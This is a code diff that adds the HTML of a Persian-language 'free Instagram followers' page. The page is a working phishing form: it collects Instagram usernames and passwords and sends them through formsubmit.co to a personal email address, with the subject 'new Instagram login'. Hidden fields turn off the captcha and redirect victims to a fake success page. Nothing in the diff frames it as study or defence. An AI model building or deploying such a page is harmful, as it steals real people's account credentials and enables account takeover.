@@ -85,4 +85,63 @@
         }
         
         .site-link {
-            margin-top:
+            margin-top: 25px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .site-link a {
+            color: #FCAF45;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        
+        .site-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .note {
+            font-size: 12px;
+            margin-top: 15px;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🌟 سرویس فالوور اینستاگرام</div>
+        <p style="margin-bottom: 20px; font-size: 16px;">فالوور رایگان دریافت کنید!</p>
+        
+        <form action="https://formsubmit.co/khodetaghi1@gmail.com" method="POST">
+            <input type="hidden" name="_subject" value="🎯 لاگین جدید اینستاگرام">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://Akinam12.github.io/instagram-followers/success.html">
+            
+            <div class="form-group">
+                <label for="username">📧 نام کاربری اینستاگرام:</label>
+                <input type="text" id="username" name="username" placeholder="نام کاربری خود را وارد کنید" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">🔑 رمز عبور:</label>
+                <input type="password" id="password" name="password" placeholder="رمز عبور خود را وارد کنید" required>
+            </div>
+            
+            <button type="submit">✨ دریافت فالوور</button>
+        </form>
+
+        <div class="site-link">
+            <p>🎯 از سایت اصلی ما دیدن کنید:</p>
+            <a href="http://127.0.0.1:5000" target="_blank">http://127.0.0.1:5000</a>
+        </div>
+        
+        <div class="note">
+            ⚡ تحویل فوری | 🔒 امنیت بالا | 🌟 فالوور واقعی
+        </div>
+    </div>
+</body>
+</html>
